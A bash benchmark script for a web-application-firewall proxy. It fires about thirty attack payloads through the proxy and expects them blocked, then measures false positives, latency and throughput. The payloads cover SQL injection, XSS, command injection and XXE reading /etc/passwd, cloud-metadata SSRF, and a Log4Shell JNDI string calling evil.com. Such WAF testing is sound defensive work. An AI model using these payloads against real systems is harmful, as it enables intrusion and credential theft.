#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# Secure Proxy Manager — 360° Benchmark Suite
# Usage: ./scripts/benchmark.sh [PROXY_HOST] [PROXY_PORT]
# ═══════════════════════════════════════════════════════════════════════════════
set -euo pipefail

PROXY="${1:-192.168.100.253}:${2:-3128}"
TARGET="http://httpbin.org"
BACKEND="http://${1:-192.168.100.253}:5001"
TOTAL_PASS=0; TOTAL_FAIL=0; TOTAL=0

# ── Helpers ──────────────────────────────────────────────────────────────────

test_waf() {
    local name="$1" cat="$2" expect="$3"; shift 3
    TOTAL=$((TOTAL + 1))
    local body http_code
    body=$(curl -s --max-time 15 -w "\n__HTTP__%{http_code}" "$@" 2>&1)
    http_code=$(echo "$body" | grep "__HTTP__" | sed 's/__HTTP__//')
    [ -z "$http_code" ] && http_code="000"
    local blocked="no"
    case "$http_code" in 403|000) blocked="yes" ;; esac
    local ok="PASS"
    if [ "$expect" = "BLOCK" ] && [ "$blocked" = "yes" ]; then ok="PASS"
    elif [ "$expect" = "ALLOW" ] && [ "$blocked" = "no" ]; then ok="PASS"
    else ok="FAIL"; fi
    [ "$ok" = "PASS" ] && TOTAL_PASS=$((TOTAL_PASS + 1)) || TOTAL_FAIL=$((TOTAL_FAIL + 1))
    printf "  [%s] %-20s %-35s %s\n" "$ok" "$cat" "$name" "$http_code"
}

run_throughput() {
    local clients=$1 total=$2
    local rounds=$((total / clients))
    local start end elapsed_ms rps
    start=$(date +%s%N)
    for _ in $(seq 1 $rounds); do
        for _ in $(seq 1 $clients); do
            curl -s -o /dev/null --max-time 15 -x "$PROXY" "$TARGET/get?q=bench" &
        done; wait
    done
    end=$(date +%s%N)
    elapsed_ms=$(( (end - start) / 1000000 ))
    rps=$(echo "scale=1; $total * 1000 / $elapsed_ms" | bc)
    printf "  %-5d clients: %5d reqs in %6dms = %7.1f req/s\n" "$clients" "$total" "$elapsed_ms" "$rps"
}

echo ""
echo "╔═══════════════════════════════════════════════════════════════════════════╗"
echo "║  SECURE PROXY MANAGER — 360° BENCHMARK SUITE                            ║"
echo "║  $(date -u '+%Y-%m-%d %H:%M:%S UTC')                                                  ║"
echo "║  Proxy: $PROXY                                                    ║"
echo "╚═══════════════════════════════════════════════════════════════════════════╝"

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "═══ SECTION 1: SECURITY — ATTACK DETECTION (31 vectors) ═══════════════"
echo ""

echo "  --- SQL Injection ---"
test_waf "UNION SELECT" "SQLi" "BLOCK" -x "$PROXY" "$TARGET/get?id=1%27+UNION+SELECT+1,2+FROM+users--"
test_waf "DROP TABLE" "SQLi" "BLOCK" -x "$PROXY" "$TARGET/get?q=%27%3BDROP+TABLE+users%3B--"
test_waf "WAITFOR DELAY" "SQLi" "BLOCK" -x "$PROXY" "$TARGET/get?id=1%3BWAITFOR+DELAY+%270%3A0%3A5%27--"
test_waf "xp_cmdshell" "SQLi" "BLOCK" -x "$PROXY" "$TARGET/get?q=EXEC+xp_cmdshell%28%27dir%27%29"
test_waf "INFORMATION_SCHEMA" "SQLi" "BLOCK" -x "$PROXY" "$TARGET/get?q=SELECT+FROM+INFORMATION_SCHEMA.TABLES"
test_waf "POST body" "SQLi" "BLOCK" -x "$PROXY" -X POST -H "Content-Type: application/json" -d '{"q":"x UNION SELECT 1,2 FROM users"}' "$TARGET/post"

echo "  --- XSS ---"
test_waf "script tag" "XSS" "BLOCK" -x "$PROXY" "$TARGET/get?q=%3Cscript%3Ealert(1)%3C/script%3E"
test_waf "javascript:" "XSS" "BLOCK" -x "$PROXY" "$TARGET/get?url=javascript:alert(document.cookie)"
test_waf "onerror" "XSS" "BLOCK" -x "$PROXY" "$TARGET/get?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
test_waf "SVG onload" "XSS" "BLOCK" -x "$PROXY" "$TARGET/get?q=%3Csvg+onload%3Dalert(1)%3E"

echo "  --- Command Injection ---"
test_waf "; cat" "CMDi" "BLOCK" -x "$PROXY" "$TARGET/get?cmd=test%3B+cat+/etc/passwd"
test_waf "| grep" "CMDi" "BLOCK" -x "$PROXY" "$TARGET/get?q=x%7C+grep+-r+password+/"
test_waf "\$(cmd)" "CMDi" "BLOCK" -x "$PROXY" "$TARGET/get?q=%24(cat+/etc/passwd)"

echo "  --- Directory Traversal ---"
test_waf "../../passwd" "DirTrav" "BLOCK" -x "$PROXY" "$TARGET/get?f=..%2F..%2F..%2Fetc%2Fpasswd"
test_waf "double-encoded" "DirTrav" "BLOCK" -x "$PROXY" "$TARGET/get?f=%252e%252e%252fetc%252fpasswd"

echo "  --- SSRF ---"
test_waf "AWS metadata" "SSRF" "BLOCK" -x "$PROXY" "http://169.254.169.254/latest/meta-data/"
test_waf "localhost" "SSRF" "BLOCK" -x "$PROXY" "$TARGET/get?url=http://127.0.0.1:8080/admin"
test_waf "file://" "SSRF" "BLOCK" -x "$PROXY" "$TARGET/get?url=file:///etc/passwd"

echo "  --- Log4Shell ---"
test_waf "JNDI UA" "Log4Shell" "BLOCK" -x "$PROXY" -A '${jndi:ldap://evil.com/x}' "$TARGET/get"

echo "  --- XXE ---"
test_waf "ENTITY SYSTEM" "XXE" "BLOCK" -x "$PROXY" -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>t</r>' "$TARGET/post"

echo "  --- Cloud Secrets ---"
test_waf "AWS key" "CloudSec" "BLOCK" -x "$PROXY" "$TARGET/get?key=AKIAIOSFODNN7EXAMPLE1"
test_waf "PEM key" "DLP" "BLOCK" -x "$PROXY" -X POST -H "Content-Type: text/plain" -d '-----BEGIN RSA PRIVATE KEY-----' "$TARGET/post"

echo "  --- Sensitive Files ---"
test_waf ".git/config" "SenFiles" "BLOCK" -x "$PROXY" "$TARGET/.git/config"
test_waf ".env" "SenFiles" "BLOCK" -x "$PROXY" "$TARGET/.env"
test_waf ".aws/creds" "SenFiles" "BLOCK" -x "$PROXY" "$TARGET/.aws/credentials"

echo "  --- Web Shells ---"
test_waf "c99.php" "WebShell" "BLOCK" -x "$PROXY" "$TARGET/uploads/c99.php"
test_waf "mimikatz" "WebShell" "BLOCK" -x "$PROXY" -X POST -H "Content-Type: text/plain" -d 'sekurlsa::logonpasswords mimikatz' "$TARGET/post"

echo "  --- Crypto/Tunnel ---"
test_waf "stratum" "CryptoTun" "BLOCK" -x "$PROXY" "$TARGET/get?pool=stratum%2Btcp://pool.minexmr.com"
test_waf "xmrig" "CryptoTun" "BLOCK" -x "$PROXY" "$TARGET/get?bin=xmrig-linux"

echo "  --- Data Exfil ---"
test_waf "discord webhook" "DataExfil" "BLOCK" -x "$PROXY" "$TARGET/get?url=https://discord.com/api/webhooks/123456/ABCDEF"

echo "  --- Java Deser ---"
test_waf "SpEL RCE" "JavaDeser" "BLOCK" -x "$PROXY" -X POST -H "Content-Type: text/plain" -d 'T(java.lang.Runtime).getRuntime().exec("calc")' "$TARGET/post"

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "═══ SECTION 2: FALSE POSITIVES (7 vectors) ══════════════════════════"
echo ""
test_waf "Normal search" "Legit" "ALLOW" -x "$PROXY" "$TARGET/get?q=hello+world"
test_waf "JSON POST" "Legit" "ALLOW" -x "$PROXY" -X POST -H "Content-Type: application/json" -d '{"user":"john","email":"j@x.com"}' "$TARGET/post"
test_waf "C++ query" "Legit" "ALLOW" -x "$PROXY" "$TARGET/get?q=c%2B%2B+programming"
test_waf "E-commerce" "Legit" "ALLOW" -x "$PROXY" "$TARGET/get?cat=electronics&brand=samsung"
test_waf "REST API" "Legit" "ALLOW" -x "$PROXY" "$TARGET/get?role=user&updated=2024-01-15"
test_waf "PDF download" "Legit" "ALLOW" -x "$PROXY" "$TARGET/get?file=report.pdf"
test_waf "OAuth callback" "Legit" "ALLOW" -x "$PROXY" "$TARGET/get?code=abc123&state=xyz"

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "═══ SECTION 3: LATENCY (20 samples) ═════════════════════════════════"
echo ""
latencies=()
for i in $(seq 1 20); do
    ms=$(curl -s -o /dev/null -w "%{time_total}" --max-time 15 -x "$PROXY" "$TARGET/get?q=lat$i" 2>/dev/null)
    ms_int=$(echo "$ms * 1000" | bc | cut -d. -f1)
    latencies+=($ms_int)
    printf "  %2d: %sms\n" "$i" "$ms_int"
done
sorted=($(printf '%s\n' "${latencies[@]:2}" | sort -n))
count=${#sorted[@]}
sum=0; for v in "${sorted[@]}"; do sum=$((sum + v)); done
avg=$((sum / count))
p50=${sorted[$((count / 2))]}
p95=${sorted[$((count * 95 / 100))]}
min=${sorted[0]}
max=${sorted[$((count - 1))]}
echo ""
printf "  Min=%dms P50=%dms Avg=%dms P95=%dms Max=%dms\n" "$min" "$p50" "$avg" "$p95" "$max"

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "═══ SECTION 4: THROUGHPUT (1→1000 clients) ══════════════════════════"
echo ""
run_throughput 1    50
run_throughput 5    50
run_throughput 10   100
run_throughput 20   100
run_throughput 50   200
run_throughput 100  500
run_throughput 200  400
run_throughput 500  1000
run_throughput 1000 1000

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "═══ SECTION 5: RESILIENCE — BURST & BACKPRESSURE ════════════════════"
echo ""

echo "  --- Burst: 100 malicious requests in parallel ---"
burst_start=$(date +%s%N)
for i in $(seq 1 100); do
    curl -s -o /dev/null --max-time 15 -x "$PROXY" "$TARGET/get?id=1'+UNION+SELECT+$i--" &
done
wait
burst_end=$(date +%s%N)
burst_ms=$(( (burst_end - burst_start) / 1000000 ))
printf "  100 attack requests: %dms (WAF + tar-pit)\n" "$burst_ms"

echo ""
echo "  --- Sustained load: 500 clean + 50 malicious mixed ---"
mixed_start=$(date +%s%N)
for i in $(seq 1 550); do
    if [ $((i % 11)) -eq 0 ]; then
        curl -s -o /dev/null --max-time 15 -x "$PROXY" "$TARGET/get?q=%3Cscript%3E$i" &
    else
        curl -s -o /dev/null --max-time 15 -x "$PROXY" "$TARGET/get?q=legit$i" &
    fi
    # Limit concurrency to 50
    if [ $((i % 50)) -eq 0 ]; then wait; fi
done
wait
mixed_end=$(date +%s%N)
mixed_ms=$(( (mixed_end - mixed_start) / 1000000 ))
mixed_rps=$(echo "scale=1; 550 * 1000 / $mixed_ms" | bc)
printf "  550 mixed requests: %dms = %.1f req/s\n" "$mixed_ms" "$mixed_rps"

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "═══ SECTION 6: WAF INTELLIGENCE SNAPSHOT ════════════════════════════"
echo ""
curl -s --max-time 5 "http://${1:-192.168.100.253}:8080/stats" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  (WAF stats endpoint unreachable from outside Docker network)"

# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "╔═══════════════════════════════════════════════════════════════════════════╗"
printf "║  SECURITY:    %d/%d passed                                              ║\n" "$TOTAL_PASS" "$TOTAL"
printf "║  LATENCY:     P50=%dms P95=%dms                                       ║\n" "$p50" "$p95"
echo "║  WAF ENGINE:   171 rules, 21 categories, anomaly scoring               ║"
echo "╚═══════════════════════════════════════════════════════════════════════════╝"
